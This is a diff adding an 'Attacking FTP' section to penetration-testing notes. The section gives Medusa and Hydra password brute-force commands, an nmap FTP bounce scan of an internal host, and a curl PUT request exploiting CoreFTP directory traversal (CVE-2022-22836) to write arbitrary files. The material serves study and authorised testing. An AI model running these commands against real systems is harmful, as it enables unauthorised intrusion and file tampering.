@@ -102,6 +102,53 @@ sudo nmap -sV -p21 -sC -A $ip
 [See more about nmap for scanning, running scripts and footprinting](nmap.md) 
 
 
+## Attacking FTP
+### Brute forcing with Medusa
+
+[Medusa Cheat sheet](medusa.md). 
+
+```bash
+# Brute force FTP logging
+medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h $IP -M ftp
+# -u: username
+# -U: list of Usernames
+# -p: password
+# -P: list of passwords
+# -h: host /IP
+# -M: protocol to bruteforce
+```
+
+However Medusa is very slow in comparison to [hydra](hydra.md):
+
+```
+# Example for ftp in a non default port
+hydra -L users.txt -P pass.txt ftp://$ip:2121
+```
+
+
+### FTP Bounce Attack
+
+An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. For instance, consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports.
+
+```shell-session
+nmap -Pn -v -n -p80 -b anonymous:password@$ipFTPdmz $ipINTERNALdmz
+# -b The `Nmap` -b flag can be used to perform an FTP bounce attack: 
+```
+
+### CoreFTP Server build 725 - Directory Traversal (Authenticated)
+
+[CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836) |   [exploit](https://www.exploit-db.com/exploits/50652)
+
+Summary: This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. 
+
+The [exploit](https://www.exploit-db.com/exploits/50652) for this attack is relatively straightforward, based on a single `cURL` command.
+
+```bash
+curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+```
+
+We create a raw HTTP `PUT` request (`-X PUT`) with basic auth (`--basic -u <username>:<password>`), the path for the file (`--path-as-is https://<IP>/../../../../../whoops`), and its content (`--data-binary "PoC."`) with this command. Additionally, we specify the host header (`-H "Host: <IP>"`) with the IP address of our target system.
+
 ## Other FTP services
 
 ### TFTP
